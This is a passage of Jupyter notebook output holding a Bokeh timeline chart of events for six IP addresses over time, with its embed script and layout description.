%T.%3N}\"]],\"formatters\":{\"type\":\"map\",\"entries\":[[\"@TimeGenerated\",\"datetime\"]]}}},{\"type\":\"object\",\"name\":\"WheelZoomTool\",\"id\":\"p3126\",\"attributes\":{\"dimensions\":\"width\",\"renderers\":\"auto\"}},{\"type\":\"object\",\"name\":\"BoxZoomTool\",\"id\":\"p3127\",\"attributes\":{\"dimensions\":\"both\",\"overlay\":{\"type\":\"object\",\"name\":\"BoxAnnotation\",\"id\":\"p3128\",\"attributes\":{\"syncable\":false,\"line_color\":\"black\",\"line_alpha\":1.0,\"line_width\":2,\"line_dash\":[4,4],\"fill_color\":\"lightgrey\",\"fill_alpha\":0.5,\"level\":\"overlay\",\"visible\":false,\"left\":{\"type\":\"number\",\"value\":\"nan\"},\"right\":{\"type\":\"number\",\"value\":\"nan\"},\"top\":{\"type\":\"number\",\"value\":\"nan\"},\"bottom\":{\"type\":\"number\",\"value\":\"nan\"},\"left_units\":\"canvas\",\"right_units\":\"canvas\",\"top_units\":\"canvas\",\"bottom_units\":\"canvas\",\"handles\":{\"type\":\"object\",\"name\":\"BoxInteractionHandles\",\"id\":\"p3134\",\"attributes\":{\"all\":{\"type\":\"object\",\"name\":\"AreaVisuals\",\"id\":\"p3133\",\"attributes\":{\"fill_color\":\"white\",\"hover_fill_color\":\"lightgray\"}}}}}}}},{\"type\":\"object\",\"name\":\"ResetTool\",\"id\":\"p3135\"},{\"type\":\"object\",\"name\":\"SaveTool\",\"id\":\"p3136\"},{\"type\":\"object\",\"name\":\"PanTool\",\"id\":\"p3137\",\"attributes\":{\"dimensions\":\"width\"}}]}},\"left\":[{\"type\":\"object\",\"name\":\"LinearAxis\",\"id\":\"p3121\",\"attributes\":{\"ticker\":{\"type\":\"object\",\"name\":\"BasicTicker\",\"id\":\"p3122\",\"attributes\":{\"mantissas\":[1,2,5]}},\"formatter\":{\"type\":\"object\",\"name\":\"BasicTickFormatter\",\"id\":\"p3123\"},\"major_label_overrides\":{\"type\":\"map\",\"entries\":[[0,\"109.88.218.99\"],[1,\"136.55.145.135\"],[2,\"24.13.212.221\"],[3,\"24.16.133.227\"],[4,\"73.226.223.252\"],[5,\"73.35.204.105\"]]},\"major_label_policy\":{\"type\":\"object\",\"name\":\"AllLabels\",\"id\":\"p3124\"}}},{\"type\":\"object\",\"name\":\"Legend\",\"id\":\"p3333\",\"attributes\":{\"location\":\"center\",\"click_policy\":\"hide\",\"label_text_font_size\":\"8pt\",\"items\":[{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p3332\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"73.35.204.105\"},\"renderers\":[{\"id\":\"p3329\"}]}},{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p3322\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"73.226.223.252\"},\"renderers\":[{\"id\":\"p3319\"}]}},{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p3312\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"24.16.133.227\"},\"renderers\":[{\"id\":\"p3309\"}]}},{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p3302\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"24.13.212.221\"},\"renderers\":[{\"id\":\"p3299\"}]}},{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p3292\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"136.55.145.135\"},\"renderers\":[{\"id\":\"p3289\"}]}},{\"type\":\"object\",\"name\":\"LegendItem\",\"id\":\"p3282\",\"attributes\":{\"label\":{\"type\":\"value\",\"value\":\"109.88.218.99\"},\"renderers\":[{\"id\":\"p3279\"}]}}]}}],\"below\":[{\"type\":\"object\",\"name\":\"DatetimeAxis\",\"id\":\"p3102\",\"attributes\":{\"ticker\":{\"type\":\"object\",\"name\":\"DatetimeTicker\",\"id\":\"p3103\",\"attributes\":{\"num_minor_ticks\":10,\"tickers\":[{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p3104\",\"attributes\":{\"num_minor_ticks\":0,\"mantissas\":[1,2,5],\"max_interval\":500.0}},{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p3105\",\"attributes\":{\"num_minor_ticks\":0,\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"min_interval\":1000.0,\"max_interval\":1800000.0}},{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p3106\",\"attributes\":{\"num_minor_ticks\":0,\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"min_interval\":3600000.0,\"max_interval\":43200000.0}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p3107\",\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p3108\",\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p3109\",\"attributes\":{\"days\":[1,8,15,22]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p3110\",\"attributes\":{\"days\":[1,15]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p3111\",\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p3112\",\"attributes\":{\"months\":[0,2,4,6,8,10]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p3113\",\"attributes\":{\"months\":[0,4,8]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p3114\",\"attributes\":{\"months\":[0,6]}},{\"type\":\"object\",\"name\":\"YearsTicker\",\"id\":\"p3115\"}]}},\"formatter\":{\"type\":\"object\",\"name\":\"DatetimeTickFormatter\",\"id\":\"p3272\",\"attributes\":{\"milliseconds\":\"%H:%M:%S.%3N\",\"seconds\":\"%H:%M:%S\",\"minutes\":\"%H:%M:%S\",\"hours\":\"%H:%M:%S\",\"days\":\"%m-%d %H:%M\"}},\"axis_label\":\"Event Time\",\"major_label_policy\":{\"type\":\"object\",\"name\":\"AllLabels\",\"id\":\"p3119\"}}}],\"center\":[{\"type\":\"object\",\"name\":\"Grid\",\"id\":\"p3120\",\"attributes\":{\"axis\":{\"id\":\"p3102\"},\"minor_grid_line_color\":\"navy\",\"minor_grid_line_alpha\":0.3}},{\"type\":\"object\",\"name\":\"Grid\",\"id\":\"p3125\",\"attributes\":{\"dimension\":1,\"axis\":{\"id\":\"p3121\"},\"grid_line_color\":null}}],\"min_border_left\":50}},{\"type\":\"object\",\"name\":\"Figure\",\"id\":\"p3172\",\"attributes\":{\"width\":900,\"height\":120,\"x_range\":{\"type\":\"object\",\"name\":\"Range1d\",\"id\":\"p3182\",\"attributes\":{\"start\":1755236755796.833,\"end\":1755296475685.633}},\"y_range\":{\"type\":\"object\",\"name\":\"DataRange1d\",\"id\":\"p3174\"},\"x_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p3183\"},\"y_scale\":{\"type\":\"object\",\"name\":\"LinearScale\",\"id\":\"p3184\"},\"title\":{\"type\":\"object\",\"name\":\"Title\",\"id\":\"p3175\",\"attributes\":{\"text\":\"Range Selector\"}},\"renderers\":[{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p3212\",\"attributes\":{\"data_source\":{\"id\":\"p3035\"},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p3213\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p3214\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p3209\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"#440154\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p3210\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p3211\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#440154\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p3221\",\"attributes\":{\"data_source\":{\"id\":\"p3038\"},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p3222\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p3223\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p3218\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"#443982\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p3219\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p3220\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#443982\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p3230\",\"attributes\":{\"data_source\":{\"id\":\"p3041\"},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p3231\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p3232\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p3227\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"#30678D\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p3228\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p3229\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#30678D\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p3239\",\"attributes\":{\"data_source\":{\"id\":\"p3044\"},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p3240\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p3241\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p3236\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"#208F8C\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p3237\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p3238\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#208F8C\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p3248\",\"attributes\":{\"data_source\":{\"id\":\"p3047\"},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p3249\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p3250\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p3245\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"#35B778\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p3246\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p3247\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#35B778\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}},{\"type\":\"object\",\"name\":\"GlyphRenderer\",\"id\":\"p3257\",\"attributes\":{\"data_source\":{\"id\":\"p3050\"},\"view\":{\"type\":\"object\",\"name\":\"CDSView\",\"id\":\"p3258\",\"attributes\":{\"filter\":{\"type\":\"object\",\"name\":\"AllIndices\",\"id\":\"p3259\"}}},\"glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p3254\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"fill_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"hatch_color\":{\"type\":\"value\",\"value\":\"#8DD644\"}}},\"nonselection_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p3255\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.1},\"fill_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.1},\"hatch_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.1}}},\"muted_glyph\":{\"type\":\"object\",\"name\":\"Circle\",\"id\":\"p3256\",\"attributes\":{\"x\":{\"type\":\"field\",\"field\":\"TimeGenerated\"},\"y\":{\"type\":\"field\",\"field\":\"y_index\"},\"radius\":{\"type\":\"value\",\"value\":1},\"line_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"line_alpha\":{\"type\":\"value\",\"value\":0.2},\"fill_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"fill_alpha\":{\"type\":\"value\",\"value\":0.2},\"hatch_color\":{\"type\":\"value\",\"value\":\"#8DD644\"},\"hatch_alpha\":{\"type\":\"value\",\"value\":0.2}}}}}],\"toolbar\":{\"type\":\"object\",\"name\":\"Toolbar\",\"id\":\"p3181\",\"attributes\":{\"tools\":[{\"type\":\"object\",\"name\":\"RangeTool\",\"id\":\"p3260\",\"attributes\":{\"x_range\":{\"id\":\"p3098\"},\"overlay\":{\"type\":\"object\",\"name\":\"BoxAnnotation\",\"id\":\"p3265\",\"attributes\":{\"syncable\":false,\"line_color\":\"black\",\"line_alpha\":1.0,\"line_width\":0.5,\"line_dash\":[2,2],\"fill_color\":\"navy\",\"fill_alpha\":0.2,\"level\":\"overlay\",\"propagate_hover\":true,\"left\":{\"type\":\"number\",\"value\":\"nan\"},\"right\":{\"type\":\"number\",\"value\":\"nan\"},\"top\":{\"type\":\"number\",\"value\":\"nan\"},\"bottom\":{\"type\":\"number\",\"value\":\"nan\"},\"left_limit\":{\"type\":\"object\",\"name\":\"Node\",\"id\":\"p3261\",\"attributes\":{\"target\":\"frame\",\"symbol\":\"left\"}},\"right_limit\":{\"type\":\"object\",\"name\":\"Node\",\"id\":\"p3262\",\"attributes\":{\"target\":\"frame\",\"symbol\":\"right\"}},\"top_limit\":{\"type\":\"object\",\"name\":\"Node\",\"id\":\"p3263\",\"attributes\":{\"target\":\"frame\",\"symbol\":\"top\"}},\"bottom_limit\":{\"type\":\"object\",\"name\":\"Node\",\"id\":\"p3264\",\"attributes\":{\"target\":\"frame\",\"symbol\":\"bottom\"}},\"editable\":true,\"handles\":{\"type\":\"object\",\"name\":\"BoxInteractionHandles\",\"id\":\"p3271\",\"attributes\":{\"all\":{\"type\":\"object\",\"name\":\"AreaVisuals\",\"id\":\"p3270\",\"attributes\":{\"fill_color\":\"white\",\"hover_fill_color\":\"lightgray\"}}}}}}}}]}},\"toolbar_location\":null,\"below\":[{\"type\":\"object\",\"name\":\"DatetimeAxis\",\"id\":\"p3185\",\"attributes\":{\"ticker\":{\"type\":\"object\",\"name\":\"DatetimeTicker\",\"id\":\"p3186\",\"attributes\":{\"num_minor_ticks\":5,\"tickers\":[{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p3187\",\"attributes\":{\"num_minor_ticks\":0,\"mantissas\":[1,2,5],\"max_interval\":500.0}},{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p3188\",\"attributes\":{\"num_minor_ticks\":0,\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"min_interval\":1000.0,\"max_interval\":1800000.0}},{\"type\":\"object\",\"name\":\"AdaptiveTicker\",\"id\":\"p3189\",\"attributes\":{\"num_minor_ticks\":0,\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"min_interval\":3600000.0,\"max_interval\":43200000.0}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p3190\",\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p3191\",\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p3192\",\"attributes\":{\"days\":[1,8,15,22]}},{\"type\":\"object\",\"name\":\"DaysTicker\",\"id\":\"p3193\",\"attributes\":{\"days\":[1,15]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p3194\",\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p3195\",\"attributes\":{\"months\":[0,2,4,6,8,10]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p3196\",\"attributes\":{\"months\":[0,4,8]}},{\"type\":\"object\",\"name\":\"MonthsTicker\",\"id\":\"p3197\",\"attributes\":{\"months\":[0,6]}},{\"type\":\"object\",\"name\":\"YearsTicker\",\"id\":\"p3198\"}]}},\"formatter\":{\"type\":\"object\",\"name\":\"DatetimeTickFormatter\",\"id\":\"p3205\",\"attributes\":{\"milliseconds\":\"%H:%M:%S.%3N\",\"seconds\":\"%H:%M:%S\",\"minutes\":\"%H:%M:%S\",\"hours\":\"%H:%M:%S\",\"days\":\"%m-%d %H:%M\"}},\"major_label_policy\":{\"type\":\"object\",\"name\":\"AllLabels\",\"id\":\"p3202\"}}},{\"type\":\"object\",\"name\":\"Title\",\"id\":\"p3204\",\"attributes\":{\"text\":\"Drag the middle or edges of the selection box to change the range in the main chart\",\"text_font_size\":\"10px\",\"align\":\"right\"}}],\"center\":[{\"type\":\"object\",\"name\":\"Grid\",\"id\":\"p3203\",\"attributes\":{\"axis\":{\"id\":\"p3185\"}}}]}}]}}]}};\n  const render_items = [{\"docid\":\"cf038837-e86c-41a2-a55e-fbe9435dd1b0\",\"roots\":{\"p3334\":\"a1f83ab5-466b-4e19-b5d2-eab1b65057c9\"},\"root_ids\":[\"p3334\"]}];\n  void root.Bokeh.embed.embed_items_notebook(docs_json, render_items);\n  }\n  if (root.Bokeh !== undefined) {\n    embed_document(root);\n  } else {\n    let attempts = 0;\n    const timer = setInterval(function(root) {\n      if (root.Bokeh !== undefined) {\n        clearInterval(timer);\n        embed_document(root);\n      } else {\n        attempts++;\n        if (attempts > 100) {\n          clearInterval(timer);\n          console.log(\"Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing\");\n        }\n      }\n    }, 10, root)\n  }\n})(window);",
      "application/vnd.bokehjs_exec.v0+json": ""
     },
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "p3334"
      }
     },
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div style=\"display: table;\"><div style=\"display: table-row;\"><div style=\"display: table-cell;\"><b title=\"bokeh.models.layouts.Column\">Column</b>(</div><div style=\"display: table-cell;\">id&nbsp;=&nbsp;'p3334', <span id=\"p3354\" style=\"cursor: pointer;\">&hellip;)</span></div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">align&nbsp;=&nbsp;'auto',</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">aspect_ratio&nbsp;=&nbsp;None,</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">children&nbsp;=&nbsp;[figure(id='p3088', ...), figure(id='p3172', ...)],</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">context_menu&nbsp;=&nbsp;None,</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">css_classes&nbsp;=&nbsp;[],</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">css_variables&nbsp;=&nbsp;{},</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">disabled&nbsp;=&nbsp;False,</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">elements&nbsp;=&nbsp;[],</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">flow_mode&nbsp;=&nbsp;'block',</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">height&nbsp;=&nbsp;None,</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">height_policy&nbsp;=&nbsp;'auto',</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">html_attributes&nbsp;=&nbsp;{},</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">html_id&nbsp;=&nbsp;None,</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">js_event_callbacks&nbsp;=&nbsp;{},</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">js_property_callbacks&nbsp;=&nbsp;{},</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">margin&nbsp;=&nbsp;None,</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">max_height&nbsp;=&nbsp;None,</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">max_width&nbsp;=&nbsp;None,</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">min_height&nbsp;=&nbsp;None,</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">min_width&nbsp;=&nbsp;None,</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">name&nbsp;=&nbsp;None,</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">resizable&nbsp;=&nbsp;False,</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">sizing_mode&nbsp;=&nbsp;None,</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: table-cell;\">spacing&nbsp;=&nbsp;0,</div></div><div class=\"p3353\" style=\"display: none;\"><div style=\"display: table-cell;\"></div><div style=\"display: 